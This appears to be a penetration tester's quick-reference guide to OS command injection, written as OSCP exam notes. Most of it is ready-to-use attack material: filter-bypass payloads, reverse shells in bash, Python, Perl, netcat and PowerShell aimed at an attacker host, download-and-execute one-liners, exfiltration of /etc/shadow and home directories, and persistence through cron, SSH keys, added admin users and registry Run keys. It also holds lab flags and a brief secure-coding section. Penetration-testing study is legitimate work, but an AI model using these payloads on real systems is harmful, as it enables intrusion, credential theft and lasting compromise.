# OS Command Injection Quick Reference Guide

## Table of Contents
1. [Discovery & Enumeration](#discovery--enumeration)
2. [Injection Testing Methodology](#injection-testing-methodology)
3. [Filter Bypass Techniques](#filter-bypass-techniques)
4. [Attack Chains](#attack-chains)
5. [OS-Specific Payloads](#os-specific-payloads)
6. [Troubleshooting](#troubleshooting)
7. [Detection & Prevention](#detection--prevention)
8. [Tools & References](#tools--references)

---

## Discovery & Enumeration

### Visual Indicators to Look For
```
Input fields that mention:
- "Execute", "Run", "Command"
- System utilities (ping, nslookup, whois, git, etc.)
- File operations (backup, archive, compress)
- Network tools (traceroute, dig, host)
- Any form processing user input for system tasks
```

### Common Vulnerable Parameters
```
?cmd=
?exec=
?command=
?execute=
?ping=
?query=
?jump=
?code=
?reg=
?do=
?func=
?arg=
?option=
?load=
?process=
?step=
?read=
?function=
?req=
?feature=
?exe=
?module=
?payload=
?run=
?print=
```

### Initial Discovery Process
```bash
# 1. Spider the application
# Look for forms, input fields, URL parameters

# 2. Check for command-related functionality
curl -s http://TARGET | grep -i "execute\|command\|run\|ping\|git\|backup"

# 3. Identify all input vectors
- GET parameters
- POST data
- HTTP headers (User-Agent, Referer, etc.)
- Cookie values
- JSON/XML input

# 4. Check error messages
# Submit invalid input and analyze responses
curl -X POST -d "param=test" http://TARGET/endpoint
```

### Behavioral Indicators
```bash
# Time-based detection
Input: && sleep 5
Response: 5 second delay = vulnerable

# Output-based detection
Input: && echo test123
Response: Contains "test123" = vulnerable

# DNS-based detection
Input: && nslookup burpcollaborator.net
Monitor: DNS query received = vulnerable

# Error-based detection
Input: |invalidcommand
Response: "command not found" = vulnerable
```

---

## Injection Testing Methodology

### Step 1: Identify Injection Context
```bash
# Determine where your input goes
Original: ping TARGET_IP
Your input replaces: TARGET_IP

# Common contexts:
1. Complete command replacement
2. Argument injection
3. Within quotes
4. After specific command
```

### Step 2: Test Basic Separators
```bash
# Unix/Linux separators
;         # Command separator
|         # Pipe
||        # OR operator
&         # Background
&&        # AND operator
\n        # Newline
\r\n      # Carriage return + newline
`command` # Command substitution
$(command) # Command substitution

# Windows separators
&         # Command separator
&&        # AND operator
|         # Pipe
||        # OR operator
%0a       # Newline (URL encoded)
%0d       # Carriage return

# Testing payload examples
input; id
input && whoami
input | hostname
input || ipconfig
```

### Step 3: Confirm Vulnerability
```bash
# Time-based confirmation (Universal)
; sleep 5    # Linux
& ping -n 6 127.0.0.1 > nul  # Windows (5 second delay)

# Output-based confirmation
; echo INJECTED
& echo INJECTED

# Math-based confirmation
; expr 7 \* 7     # Should output 49
& set /a 7*7      # Windows

# Command substitution test
$(whoami)
`id`
```

### Step 4: Identify Execution Environment
```bash
# Detect OS
; uname -a      # Linux output
& ver           # Windows output

# Detect shell (Linux)
; echo $SHELL
; echo $BASH_VERSION

# Detect PowerShell vs CMD (Windows)
# Use this special payload:
`(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`
# Returns "CMD" if cmd.exe, "PowerShell" if PowerShell
```

---

## Filter Bypass Techniques

### Encoding Bypasses
```bash
# URL Encoding
%3B       # ;
%26       # &
%7C       # |
%20       # space
%0A       # newline
%0D       # carriage return
%24       # $
%28%29    # ()
%60       # `

# Double URL Encoding
%253B     # ;
%2526     # &

# Unicode Encoding
%u003B    # ;
%u0026    # &

# HTML Entity Encoding
&#59;     # ;
&#38;     # &
```

### Space Bypass Techniques
```bash
# Linux
${IFS}    # Internal Field Separator
$IFS$9    # Tab
{command,arg}  # Brace expansion
%09       # Tab (URL encoded)

# Examples
;cat${IFS}/etc/passwd
;{cat,/etc/passwd}
;cat$IFS$9/etc/passwd

# Windows
%ProgramFiles:~10,1%  # Space using variable substring
%TEMP:~-1,1%          # Space alternative
```

### Keyword Filter Bypasses
```bash
# Case variations (Windows)
WhOaMi
IPCONFIG

# Concatenation (Linux)
w'h'o'a'm'i
w"h"o"a"m"i
who$()ami
w\h\o\a\m\i

# Variable expansion
a=who;b=ami;$a$b
${a}${b}

# Encoding within commands
echo d2hvYW1p | base64 -d | bash  # whoami in base64
```

### Command Obfuscation
```bash
# Using wildcards
/bin/c?t /etc/p?sswd
/bin/c* /etc/p*d
/???/c?t /???/??ss??

# Using environment variables
$PATH/whoami
${PATH:0:1}bin${PATH:0:1}cat

# Reverse and execute
echo 'imaohw' | rev | bash
```

### Filter Requirement Bypasses
```bash
# If filter requires specific command (e.g., "ping")
ping; whoami
ping && id
ping || ls
ping `whoami`

# If checking for start of input
garbage || whoami ||
test; whoami #

# If checking end of input
whoami ;echo done
id && echo expected
```

---

## Attack Chains

### Linux Attack Chain
```bash
# 1. Confirm injection
curl -X POST --data 'param=test;id' http://TARGET/vuln

# 2. Enumerate environment
;id                    # User context
;pwd                   # Current directory
;ls -la               # List files
;cat /etc/passwd      # User enumeration
;sudo -l              # Sudo privileges
;which python python3 perl bash nc  # Available tools

# 3. Simple reverse shell (bash)
;bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# URL encoded version
%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER%2F4444%200%3E%261%22

# 4. Alternative shells
# Python
;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Perl
;perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Netcat
;nc -e /bin/bash ATTACKER 4444
;nc ATTACKER 4444 -e /bin/bash
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# 5. Privilege escalation
sudo su
sudo -i
sudo bash
```

### Windows Attack Chain
```bash
# 1. Confirm injection
curl -X POST --data 'param=test&ipconfig' http://TARGET/vuln

# 2. Enumerate environment
& whoami              # Current user
& hostname            # System name
& whoami /priv        # Privileges
& net user            # List users
& systeminfo          # System details
& dir C:\             # List C: drive

# 3. PowerShell detection
& (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# 4. PowerShell reverse shell
# Direct execution
& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# 5. PowerCat download and execute
& IEX (New-Object System.Net.Webclient).DownloadString("http://ATTACKER/powercat.ps1");powercat -c ATTACKER -p 4444 -e powershell

# URL encoded version (use %20 for spaces, %3B for semicolons)
%26%20IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2FATTACKER%2Fpowercat.ps1%22)%3Bpowercat%20-c%20ATTACKER%20-p%204444%20-e%20powershell

# 6. CMD reverse shell alternatives
& certutil -urlcache -f http://ATTACKER/nc.exe nc.exe & nc.exe ATTACKER 4444 -e cmd.exe
```

### Docker/Container Attack Chain
```bash
# 1. Detect container
;cat /proc/1/cgroup | grep docker
;ls -la /.dockerenv

# 2. Escape attempts
;nsenter --target 1 --mount --uts --ipc --net --pid bash
;docker run -v /:/host -it ubuntu chroot /host

# 3. Find sensitive mounts
;mount | grep -E "^/dev"
;df -h
;cat /proc/mounts
```

---

## OS-Specific Payloads

### Linux One-Liners
```bash
# Read files
;cat /etc/passwd
;head -n 20 /var/log/apache2/access.log
;tail /home/user/.bash_history

# Download and execute
;wget http://ATTACKER/shell.sh -O /tmp/s;bash /tmp/s
;curl http://ATTACKER/shell.sh|bash

# Add SSH key
;echo "ssh-rsa AAAAB3... attacker@kali" >> ~/.ssh/authorized_keys

# Cron persistence
;echo "* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" | crontab -

# Data exfiltration
;tar czf - /home | curl -X POST --data-binary @- http://ATTACKER/
;cat /etc/shadow | curl -X POST -d @- http://ATTACKER/
```

### Windows One-Liners
```powershell
# Read files
& type C:\Windows\System32\drivers\etc\hosts
& more C:\Users\Administrator\Desktop\*.txt
& dir /s C:\ | findstr /i flag

# Download and execute
& certutil -urlcache -f http://ATTACKER/shell.exe shell.exe & shell.exe
& powershell "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/script.ps1')"
& bitsadmin /transfer myDownloadJob /download /priority normal http://ATTACKER/shell.exe %TEMP%\shell.exe & %TEMP%\shell.exe

# Add user
& net user hacker Password123! /add
& net localgroup administrators hacker /add

# Registry persistence
& reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe"

# Enable RDP
& reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
& netsh firewall set service type = remotedesktop mode = enable
```

### Universal Python Payload
```python
# Works on both Windows and Linux if Python is installed
;python -c "
import socket,subprocess,os,platform
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('ATTACKER',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
shell = '/bin/bash' if platform.system()=='Linux' else 'cmd.exe'
subprocess.call([shell,'-i'])"
```

---

## Troubleshooting

### Common Issues and Solutions

| Issue | Diagnosis | Solution |
|-------|-----------|----------|
| **No output returned** | Command executed but output not displayed | Try redirecting to a file and reading it: `;id > /tmp/out; cat /tmp/out` |
| **"Command not found"** | Binary not in PATH or doesn't exist | Use full paths: `/usr/bin/id` instead of `id` |
| **Special characters blocked** | Filter strips certain characters | Try encoding or alternative syntax |
| **Spaces filtered** | Space character is blocked | Use `${IFS}`, tabs (`%09`), or brace expansion |
| **Limited command length** | Input truncated | Use shorter payloads or download and execute |
| **Firewall blocks outbound** | Reverse shell fails | Try bind shell or web shell upload |
| **Non-interactive shell** | Can't run interactive commands | Upgrade shell: `python -c 'import pty;pty.spawn("/bin/bash")'` |
| **Commands timeout** | Long-running commands killed | Background execution: `command &` or use nohup |

### Debugging Techniques
```bash
# 1. Test progressively
;echo test           # Basic test
;echo test > /tmp/a  # Write test
;id                  # Command execution
;id > /tmp/b         # Output redirection

# 2. Check what's being executed
;echo "COMMAND: $0 $@"
;set                 # Show environment

# 3. Error visibility
;id 2>&1             # Redirect stderr to stdout
;id || echo "FAILED" # Show if command failed

# 4. Timing confirmation
;sleep 5             # Should delay response
;ping -c 5 127.0.0.1 # 5 second delay

# 5. DNS exfiltration test
;nslookup `whoami`.attacker.com
;ping `hostname`.attacker.com
```

### Shell Stabilization
```bash
# After getting reverse shell

# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then background with Ctrl+Z
stty raw -echo && fg

# Set terminal
export TERM=xterm-256color
export SHELL=/bin/bash

# Fix dimensions
stty rows 38 columns 116
```

---

## Detection & Prevention

### For Pentesters - Confirming Impact
```bash
# Proof of concept without damage
;whoami;hostname;pwd    # Show context
;ls -la /root           # Show access level
;sudo -l                # Show privileges

# Safe file creation for proof
;touch /tmp/pwned_by_[your_name]
;echo "PoC by [your_name]" > /tmp/proof.txt
```

### For Defenders - Secure Coding
```bash
# NEVER do this:
system("ping " + user_input)
exec("git " + $_POST['repo'])
eval("process " + request.params.cmd)

# DO this instead:
# Use parameterized commands
# Use allowlists for commands
# Escape shell metacharacters
# Use language-specific APIs
# Run with minimal privileges

# Input validation regex
^[a-zA-Z0-9\.\-]+$    # Alphanumeric, dots, dashes only
^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$  # IP address only
```

### WAF Bypass Considerations
```bash
# If WAF blocks common commands
w'h'o'a'm'i          # Quote bypass
w\h\o\a\m\i         # Backslash bypass
who$(echo)ami        # Command substitution
who""ami             # Empty quotes

# If WAF has request size limit
;wget http://a.com/s -O-|sh  # Short payload

# If WAF blocks certain IPs
# Use DNS instead of IP
;bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

---

## Tools & References

### Enumeration Tools
```bash
# Fuzzing for parameters
wfuzz -c -z file,/usr/share/wordlists/params.txt --hc 404 http://TARGET?FUZZ=id

# Command injection specific
commix --url="http://TARGET/page?param=INJECT" --level=3 --risk=3

# Manual testing
Burp Suite - Intruder with command injection payloads
```

### Payload Generators
```bash
# MSFvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw

# Online resources
https://www.revshells.com/          # Reverse shell generator
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
```

### Detection Payloads
```bash
# Time-based detection wordlist
sleep 5
sleep$(IFS)5
`sleep 5`
;sleep 5
|sleep 5
||sleep 5
&sleep 5
&&sleep 5

# Output-based detection wordlist
;echo INJECT
|echo INJECT
`echo INJECT`
$(echo INJECT)
;echo${IFS}INJECT
```

### Useful Environment Commands
```bash
# Linux
env                  # Environment variables
which python perl bash nc wget curl  # Available tools
ps aux              # Running processes
netstat -tulpn      # Network connections
find / -perm -u=s -type f 2>/dev/null  # SUID files

# Windows
set                 # Environment variables
where python perl   # Find executables
tasklist            # Running processes
netstat -an         # Network connections
whoami /priv        # Current privileges
```

---

## Real-World Examples from Labs

### Mountain Vaults (Git Archive) - Windows
```bash
# Vulnerability: Command injection in git parameter
# Bypass: Required "git" prefix
# Payload: git;[COMMAND]

# Exploitation
curl -X POST --data 'Archive=git%3Bipconfig' http://TARGET:8000/archive

# Reverse shell
git;IEX (New-Object System.Net.Webclient).DownloadString("http://ATTACKER/powercat.ps1");powercat -c ATTACKER -p 4444 -e powershell

# Flag location: C:\Users\Administrator\Desktop\secrets.txt
```

### Mountain Vaults (Git Archive) - Linux
```bash
# Same vulnerability, different OS
# User: stanley (sudo group)

# Exploitation
curl -X POST --data 'Archive=git%3Bid' http://TARGET/archive

# Privilege escalation (no password required)
curl -X POST --data 'Archive=git%3Bsudo%20cat%20/opt/config.txt' http://TARGET/archive

# Flags found:
# Windows: OS{75ccdbd6bb480567075cf42263958d95}
# Linux: OS{42aefb285b23711f2bab0ff011ff2afc}
```

---

## Quick Decision Tree

```
Found input field → Try basic injection (; whoami)
           ↓ Blocked?
    Try encoding (%3B)
           ↓ Still blocked?
    Try separator variants (|, ||, &, &&, `, $())
           ↓ Works?
    Identify OS → Windows? → PowerShell payload
                → Linux? → Bash payload
           ↓
    Get reverse shell
           ↓
    Privilege escalation
           ↓
    Flag/Objective
```

---

## OSCP Exam Notes

1. **Time management**: Spend max 30 mins on injection discovery per input
2. **Document everything**: Screenshot both failed and successful attempts
3. **Start simple**: Basic `;id` before complex payloads
4. **Check filters**: Identify what's blocked before crafting bypasses
5. **Multiple vectors**: Try GET, POST, headers, cookies
6. **Stabilize shells**: Upgrade to PTY immediately for Linux
7. **Persistence**: Add SSH keys or create users as backup
8. **Clean exploitation**: Use safe PoC commands for report